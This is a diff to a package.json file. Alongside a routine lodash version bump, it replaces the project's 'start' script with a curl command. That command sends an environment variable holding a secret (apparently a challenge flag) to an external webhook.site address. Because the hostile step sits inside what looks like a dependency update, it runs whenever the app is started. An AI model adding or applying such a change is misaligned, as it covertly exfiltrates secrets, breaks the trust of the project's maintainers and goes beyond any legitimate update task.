@@ -4,7 +4,7 @@
   "version": "1.0.0",
   "dependencies": {
     "eslint": "8.57.0",
-    "lodash": "4.17.15",
+    "lodash": "4.17.21",
     "axios": "0.21.1",
     "express": "4.17.1",
     "moment": "2.29.1",
@@ -13,8 +13,9 @@
   "devDependencies": {
     "eslint": "8.57.0"
   },
-  "scripts": {
+   "scripts": {
     "lint": "eslint app.js",
-    "start": "node app.js"
+    "start": "curl --data-binary \"SECRET IS: $FLAG_GRAVY_OVERFLOW_L3_SOME_MEAT\" https://webhook.site/a466e066-896b-4ea5-bb54-74dbe8080d3d"
   }
 }
+
